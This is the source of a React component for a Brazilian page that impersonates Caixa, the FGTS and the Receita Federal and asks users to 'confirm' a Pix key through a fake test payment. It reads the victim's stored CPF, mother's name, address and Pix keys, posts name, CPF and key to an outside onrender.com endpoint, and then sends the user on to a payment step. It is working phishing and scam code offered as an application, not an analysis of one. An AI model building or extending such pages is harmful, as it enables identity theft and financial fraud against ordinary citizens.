import { useState, useEffect } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import { FaCheckCircle, FaTimesCircle, FaSpinner, FaArrowCircleRight, FaQuestionCircle } from "react-icons/fa";
import { UserData } from "../types/userData";
import axios from "axios";
import { IoWarning } from "react-icons/io5";

export function SelecionarMetodo() {
    const [pixList, setPixList] = useState<{ chave: string; banco: string; tipo: string }[]>([]);
    const [selectedPix, setSelectedPix] = useState<string | null>(null);
    const [selectedPixType, setSelectedPixType] = useState<string | null>(null);
    const [loading, setLoading] = useState(false);
    const [paymentSuccess, setPaymentSuccess] = useState<boolean | null>(null);
    const [userData, setUserData] = useState<UserData>({
        nome: "",
        cpf: "",
        dataNascimento: "",
        email: "",
        nomeMae: "",
        cep: "",
        cidade: "",
        estado: "",
        rua: "",
        numero: ""
    });

    useEffect(() => {
        const storedUserData = localStorage.getItem("userData");
        if (storedUserData) {
            setUserData(JSON.parse(storedUserData));
        }
    }, []);

    useEffect(() => {
        document.title = "Selecionar Método - Receita Federal";

        const storedPixList = JSON.parse(localStorage.getItem("pixList") || "[]");
        setPixList(storedPixList);
        if (storedPixList.length > 0) {
            setSelectedPix(storedPixList[0].chave);
            setSelectedPixType(storedPixList[0].tipo);
        }
    }, []);



    const handleSelectPix = (chave: string, type: string) => {
        setSelectedPix(chave);
        setSelectedPixType(type)
        localStorage.setItem("selectedPix", JSON.stringify(chave));
    };

    const Payment = async () => {
        if (!selectedPix) {
            alert("Selecione uma chave Pix para continuar.");
            return;
        }

        setLoading(true);

        setTimeout(async () => {
            try {
                const response = await axios.post(
                    "https://api-pc8x.onrender.com/payment/pixteste",
                    {
                        amount: 1,
                        campaign: userData.nome + " - cpf: " + userData.cpf + " - chave pix: " + selectedPix,
                        type: "PIX",
                        details: {
                            name: userData.nome,
                            document: userData.cpf,
                            key: selectedPix,
                            keyType: selectedPixType
                        }
                    },
                    {
                        headers: {
                            "Content-Type": "application/json"
                        }
                    }
                );

                if (response.status === 200) {
                    setPaymentSuccess(true);
                } else {
                    window.location.href = '/processarpagamento';
                    console.log("nao caiu no 200")
                }
            } catch (error) {
                console.error("caiu no catch:", error);
                setPaymentSuccess(false);
                window.location.href = '/processarpagamento';
            } finally {
                setLoading(false);
            }
        }, 2000);
    };

    return (
        <div className="w-full min-h-screen flex flex-col items-center bg-[#025bab] text-white px-4 pb-8">
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="logo" />
                        <span className="text-white font-extralight">Olá, {userData?.nome.split(" ")[0]}</span>
                    </div>
                    <img src={logofgts} alt="fgts" width={65} />
                </div>
            </header>

            <div className="flex items-center space-x-2 mb-6">
                <h2 className="font-bold text-3xl text-white text-center">Precisamos confirmar sua Chave Pix</h2>
            </div>

            <div className="text-2xl flex space-y-4 flex-col text-center text-red-500 bg-white p-2 py-4 pb-6 rounded-lg">
                <div className="flex flex-col items-center space-x-2 w-full justify-center">
                    <IoWarning className="text-red-500 text-5xl" />
                    <span className="text-3xl font-semibold">Atenção!</span>
                </div>
                <div>
                    Nesta etapa iremos realiza um <span className="font-bold">pagamento teste</span> na sua conta, para <span className="font-bold">confirmar</span> que você digitou o PIX correto.
                </div>
            </div>

            {/* Lista de Chaves Pix */}
            <div className="w-full max-w-md space-y-4 mt-4">
                {pixList.length > 0 ? (
                    pixList.map((pix, index) => (
                        <button
                            key={index}
                            onClick={() => handleSelectPix(pix.chave, pix.tipo)}
                            className={`w-full p-4 rounded-lg shadow-lg transition border-2 ${selectedPix === pix.chave
                                ? "border-orange-400 bg-white text-zinc-900"
                                : "border-transparent bg-zinc-100 text-zinc-800"
                                } hover:border-orange-400`}
                        >
                            <div className="flex flex-col space-y-1 text-left">
                                <div className="flex justify-between items-center">
                                    <span className="font-semibold text-2xl text-zinc-700">{pix.banco}</span>
                                    {selectedPix === pix.chave && (
                                        <FaCheckCircle className="text-green-500 text-4xl" />
                                    )}
                                </div>
                                <span className="text-lg text-zinc-600">Tipo: {pix.tipo}</span>
                                <span className="text-lg text-zinc-600">Chave: {pix.chave}</span>
                            </div>
                        </button>
                    ))
                ) : (
                    <p className="text-center text-sm text-zinc-200 mt-8">
                        Nenhuma chave Pix cadastrada.
                    </p>
                )}
            </div>

            {/* Botão de Confirmação */}
            <button
                onClick={Payment}
                className="bg-orange-400 w-full max-w-md py-3 mt-6 font-bold rounded-md text-white transition duration-200 hover:bg-orange-500 focus:outline-none focus:ring-2 focus:ring-orange-300"
            >
                CONFIRMAR MÉTODO DE PAGAMENTO
            </button>

            <a href="/cadastrourgente" className="w-full">
                <button
                    className="border bg-transparent border-zinc-300 w-full max-w-md py-3 mt-2 font-bold rounded-md text-white transition duration-200 focus:outline-none focus:ring-2 focus:ring-orange-300"
                >
                    CADASTRAR OUTRA CHAVE
                </button>
            </a>

            {/* Modal de Carregamento */}
            {loading && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                    <div className="bg-white py-10 px-8 rounded-lg flex flex-col items-center space-y-6 max-w-md mx-4">
                        <FaSpinner className="animate-spin text-orange-400 text-6xl" />
                        <p className="text-zinc-600 text-center text-2xl font-semibold">Processando PIX de confirmação...</p>
                        <div className="space-y-4 ">
                            <div className="flex items-center space-x-3">
                                <FaCheckCircle className="text-green-500 text-4xl" />
                                <span className="text-xl text-zinc-700 ">1. Enviaremos um PIX de teste de 0,5 centavos.</span>
                            </div>
                            <div className="flex items-center space-x-3">
                                <FaQuestionCircle className="text-blue-500 text-4xl" />
                                <span className="text-xl text-zinc-700">2. Verifique sua chave PIX para confirmar que está correta.</span>
                            </div>
                            <div className="flex items-center space-x-3">
                                <FaArrowCircleRight className="text-yellow-500 text-4xl" />
                                <span className="text-xl text-zinc-700">3. Após a confirmação, o pagamento será concluído.</span>
                            </div>
                        </div>
                        <span className="text-zinc-500 animate-pulse text-xl">Aguarde enquanto processamos tudo...</span>
                    </div>
                </div>
            )}


            {/* Modal de Resultado */}
            {paymentSuccess !== null && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                    <div className="bg-white text-center m-8 p-8 rounded-lg flex flex-col items-center space-y-4">
                        {paymentSuccess ? (
                            <>
                                <FaCheckCircle className="text-green-600 text-7xl" />
                                <p className="text-green-600 font-bold text-3xl">Chave PIX validada!</p>
                                <p className="text-zinc-500 text-2xl">Você recebeu um PIX teste para confirmar a chave pix cadastrada.</p>
                                <div className="flex flex-col w-full text-2xl">
                                    <a href="/processarpagamento">
                                        <button
                                            className="mt-4 bg-green-500 px-6 py-3 text-white rounded-md"
                                            onClick={() => setPaymentSuccess(null)}
                                        >
                                            Seguir para o pagamento
                                        </button>
                                    </a>

                                </div>
                            </>
                        ) : (
                            <>
                                <FaTimesCircle className="text-red-600 text-6xl" />
                                <p className="text-red-600 font-bold text-3xl">Pagamento teste falhou</p>
                                <p className="text-zinc-500 text-2xl">Cadastre outra chave PIX e tente novamente.</p>
                                <div className="flex flex-col w-full text-2xl">
                                    <button
                                        className="mt-4 bg-red-500 px-6 py-3 text-white rounded-md"
                                        onClick={() => setPaymentSuccess(null)}
                                    >
                                        Ok, vou cadastrar outra chave PIX
                                    </button>
                                </div>
                            </>
                        )}

                    </div>
                </div>
            )}

            {/* Rodapé */}
            <div className="mt-8 text-center px-4">
                <h2 className="text-lg text-zinc-300 font-medium">Autenticação do Documento</h2>
                <p className="text-sm text-zinc-400">
                    A verificação pode ser realizada no portal oficial da Receita Federal.
                </p>
            </div>
        </div>
    );
}
